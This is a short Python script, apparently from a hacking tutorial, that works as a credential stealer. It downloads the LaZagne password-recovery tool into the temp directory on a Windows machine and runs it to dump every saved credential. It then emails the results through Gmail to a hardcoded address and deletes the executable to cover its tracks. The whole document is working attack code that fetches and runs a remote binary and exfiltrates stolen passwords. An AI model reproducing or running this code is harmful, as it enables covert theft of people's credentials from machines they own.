# This only works on Windows computers for now

import requests, subprocess, smtplib, os, tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def download(url):
  get_response = requests.get(url)
  file_name = url.split("/")[-1]
  # Creates a list, and each element in the list is a part of the
  # url separated by to forward slashes. We use -1 because we want
  # the last element of the list
  with open(file_name, "wb") as out_file:
    #everything within this block is going to be executed while
    # the file is open
    out_file.write(get_response.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download('https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe')
command = "lazagne.exe all"
result =  subprocess.check_output(command,shell=True)
send_mail("mattolisaverio@gmail.com", "password", result)
os.remove("lazagne.exe")



